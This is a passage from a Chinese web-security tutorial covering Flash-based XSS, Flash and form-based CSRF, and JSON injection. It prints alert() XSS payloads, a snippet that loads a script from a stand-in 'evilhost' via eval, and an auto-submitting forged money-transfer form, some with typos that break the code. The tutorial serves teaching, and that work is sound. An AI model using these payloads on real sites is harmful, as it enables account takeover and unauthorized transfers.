data-highlighter="shiki" data-ext="html" data-title="html" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">有如下脚本代码,保存为xss.swf</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">getURL(&#39;javascript:alert(123);&#39;);</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">嵌入HTML代码中</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">&lt;</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">object</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> id</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">=</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">&quot;xxx&quot;</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> width</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">=</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">&quot;200&quot;</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> height</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">=</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">&quot;150&quot;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">&gt;</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">	&lt;</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">param</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> name</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">=</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">&quot;movie&quot;</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> value</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">=</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">&quot;movie.swf&quot;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">&gt;</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">	&lt;</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">embed</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> AllowScriptAccess</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">=</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">&quot;always&quot;</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> name</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">=</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">&quot;xxx&quot;</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> src</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">=</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">&quot;xss.swf&quot;</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> type</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">=</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">&quot;application/x-shockwave-flash&quot;</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> width</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">=</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">&quot;200&quot;</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> heigth</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">=</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">&quot;200&quot;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">&gt;</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">	&lt;/</span><span style="--shiki-light:white;--shiki-dark:#E06C75;">embed</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">&gt;</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">&lt;/</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">object</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">&gt;</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">直接访问即可弹窗</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>除了getURL方法，AS3.0中还能使用Externalinterface类来执行javascript脚本</p><figure><img src="/articles/assets/Externalinterface-Cw_vwVjz.png" alt="Externalinterface" tabindex="0" loading="lazy"><figcaption>Externalinterface</figcaption></figure><p>(1)传统派</p><p>ExternalInterface.call(&quot;alert&quot;,&quot;xss&quot;)</p><p>//第一个参数为函数名，第二个参数是要传递的参数</p><p>(2)直接执行javascript语句</p><p>ExternalInterface.call(&quot;function(){alert(&#39;xss&#39;);}&quot;);</p><p>var xss:String = &quot;function(){alert(&#39;xss&#39;);}&quot;;</p><p>ExternalInterface.call(xss);</p><p>(3)使用XML格式</p><div class="language-html line-numbers-mode" data-highlighter="shiki" data-ext="html" data-title="html" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">import flash.external.ExternalInterface;</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">var myJavaScript:XML =</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">&lt;</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">script</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">&gt;</span></span>
<span class="line"><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2;">    &lt;!</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">[</span><span style="--shiki-light:#986801;--shiki-dark:#E5C07B;">CDATA</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">[</span></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">		function</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">(){</span></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">			function</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;"> xss</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">(){</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">				alert</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">(</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">&quot;xss&quot;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">);</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">				};</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#E06C75;">			xss</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">;</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">		}</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">	]]</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2;">&gt;</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">&lt;/</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">script</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">&gt;</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">ExternalInterface.call(myJavaScript);</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>(4)调用外部javascript</p><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" data-title="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span>var fun =&quot;var x=document.creatElement(\&quot;SCRIPT\&quot;)&quot;;x.src=\&quot;http://evilhost/xss.js\&quot;;</span></span>
<span class="line"><span>x.defer=true;document.getElementsByTagName(\&quot;HEAD\&quot;)[0].appendChild(x);&quot;;</span></span>
<span class="line"><span>flash.external.ExternalInterface.call(&quot;eval&quot;,fun);</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h2 id="_2-13-利用flash进行csrf" tabindex="-1"><a class="header-anchor" href="#_2-13-利用flash进行csrf"><span>2.13 利用Flash进行csrf</span></a></h2><p>allowNetWorking设置不当会导致csrf</p><figure><img src="/articles/assets/allowNetWorking-dCH27LjU.png" alt="allowNetWorking" tabindex="0" loading="lazy"><figcaption>allowNetWorking</figcaption></figure><p>要使用flash进行csrf该属性必须设置all或者internal</p><h2 id="_2-14-深入xss原理" tabindex="-1"><a class="header-anchor" href="#_2-14-深入xss原理"><span>2.14 深入XSS原理</span></a></h2><h3 id="_2-14-1-csrf简析" tabindex="-1"><a class="header-anchor" href="#_2-14-1-csrf简析"><span>2.14.1 csrf简析</span></a></h3><p><strong>原理剖析</strong></p><p>1.编写web应用程序存在漏洞导致被恶意利用</p><p>2.web浏览器对cookie和http身份验证等会话信息的处理存在一定缺陷</p><div class="language-html line-numbers-mode" data-highlighter="shiki" data-ext="html" data-title="html" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">假设存在如下表单</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">&lt;</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">form</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> action</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">=</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">&quot;transfer.php&quot;</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> meyhod</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">=</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">&quot;POST&quot;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">&gt;</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">    账号:&lt;</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">input</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> type</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">=</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">&quot;text&quot;</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> name</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">=</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">&quot;tobankid&quot;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">/&gt;&lt;/</span><span style="--shiki-light:white;--shiki-dark:#E06C75;">br</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">&gt;</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">    密码:&lt;</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">input</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> type</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">=</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">&quot;text&quot;</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> name</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">=</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">&quot;money&quot;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">/&gt;&lt;/</span><span style="--shiki-light:white;--shiki-dark:#E06C75;">br</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">&gt;</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">&lt;</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">input</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> type</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">=</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">&quot;submit&quot;</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> value</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">=</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">&quot;提交&quot;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> /&gt;</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">&lt;/</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">form</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">&gt;</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>用户输入账号和金额就能转账，攻击者构造特殊的url并诱导其点击，由于用户在本地已经保留cookie,用户会直接完成转账</p><div class="language-html line-numbers-mode" data-highlighter="shiki" data-ext="html" data-title="html" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">改用post方式发送</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">&lt;</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">form</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> id</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">=</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">&quot;test&quot;</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> method</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">=</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">&quot;post&quot;</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> action</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">=</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">&quot;url&quot;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">&gt;</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">&lt;</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">input</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> name</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">=</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">&quot;tobankid&quot;</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> value</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">=</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">&quot;99&quot;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">&gt;</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">&lt;</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">input</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> name</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">=</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">&quot;money&quot;</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> value</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">=</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">&quot;1000&quot;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">&gt;</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">&lt;</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">input</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> type</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">=</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">&quot;submit&quot;</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> value</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">=</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">&quot;提交&quot;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> /&gt;</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">&lt;/</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">form</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">&gt;</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">&lt;</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">script</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">&gt;</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#E5C07B;">test</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">.</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">submit</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">();</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">&lt;/</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">script</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">&gt;</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><figure><img src="/articles/assets/csrfstyle-BdIQDuTE.png" alt="csrfstyle" tabindex="0" loading="lazy"><figcaption>csrfstyle</figcaption></figure><p>iGaming CMS中存在csrf通过post方式添加管理员的操作；可通过抓取添加用户的数据包构造exp，当管理员cookie存在时访问恶意链接即可创建新管理员；</p><h3 id="_2-14-2-hacking-json" tabindex="-1"><a class="header-anchor" href="#_2-14-2-hacking-json"><span>2.14.2 Hacking JSON</span></a></h3><p><strong>json概述</strong></p><p>json 是存储和交换文本信息的一种语法，json是javascript的子集，格式为“名/值对”</p><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" data-title="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span>&quot;name&quot;:&quot;xxxx&quot;</span></span>
<span class="line"><span>值可以是以下数据类型：</span></span>
<span class="line"><span>数字（整数或浮点数）</span></span>
<span class="line"><span>字符串（在双引号中）</span></span>
<span class="line"><span>逻辑值（true或者是false）</span></span>
<span class="line"><span>数组（在方括号中）</span></span>
<span class="line"><span>对象（在花括号中）</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><div class="language-json line-numbers-mode" data-highlighter="shiki" data-ext="json" data-title="json" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;">//对象在花括号中书写</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">var myJSon ={</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">	&quot;firstname&quot;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> : </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">&quot;xxx&quot;</span></span>
<span class="line"><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">	&quot;lastname&quot;</span><span style="--shiki-light:white;--shiki-dark:#FFFFFF;">	:</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> &quot;xxx&quot;</span></span>
<span class="line"><span style="--shiki-light:white;--shiki-dark:#FFFFFF;">doucument.write(myJSon.firstname);</span><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;"> //输出xxx</span></span>
<span class="line"><span style="--shiki-light:white;--shiki-dark:#FFFFFF;">doucument.write(myjson.lastname);</span><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;"> //输出xxx</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">}</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;">//数组在方括号中书写，数组中可有多个对象</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">var user =[</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">{</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">&quot;firstname&quot;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">:</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">&quot;xxx&quot;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">,</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">&quot;lastname&quot;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">:</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">&quot;xxx&quot;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">}</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">{</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">&quot;firstname&quot;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">:</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">&quot;xxx&quot;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">,</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">&quot;lastname&quot;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">:</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">&quot;xxx&quot;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">}</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">{</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">&quot;firstname&quot;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">:</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">&quot;xxx&quot;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">,</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">&quot;lastname&quot;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">:</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">&quot;xxx&quot;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">}</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">]</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;">//访问jascript对象数组中的第一项</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">user[</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;">0</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">].lastname;</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;">//xxx</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p><strong>json应用</strong></p><div class="language-html line-numbers-mode" data-highlighter="shiki" data-ext="html" data-title="html" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">假设一个test.json文件内容</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">var test={&quot;name&quot;:&quot;xss&quot;}</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">只用在标签中引入该文件</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">&lt;</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">script</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;">  src</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">=</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">&quot;test.json&quot;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">&gt;&lt;/</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">script</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">&gt;</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">&lt;</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">script</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">&gt;</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">alert</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">(</span><span style="--shiki-light:#383A42;--shiki-dark:#E5C07B;">test</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">.</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">name</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">);</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">alert</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">(</span><span style="--shiki-light:#383A42;--shiki-dark:#E5C07B;">test</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">.</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">length</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">);</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">&lt;/</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">script</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">&gt;</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">浏览器可通过XMLHttpRequest获取json文本的数据，然后通过eval转换为有用的数据结构</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">httpRequest =getHttpRequest()//创建对象</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">//get test.json</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">var test= eval(httpRequest.responseText)</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">alert(test.name);</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p><strong>json注入</strong></p><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" data-title="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span>假设用户能修改用户信息，伪造攻击脚本</span></span>
<span class="line"><span>name:&lt;img src=javascript:alert(xss)&gt;</span></span>
<span class="line"><span>服务器有json格式</span></span>
<span class="line"><span>var user={&quot;name&quot;:&quot;$name&quot;}</span></span>
<span class="line"><span>当用户打开恶意地址</span></span>
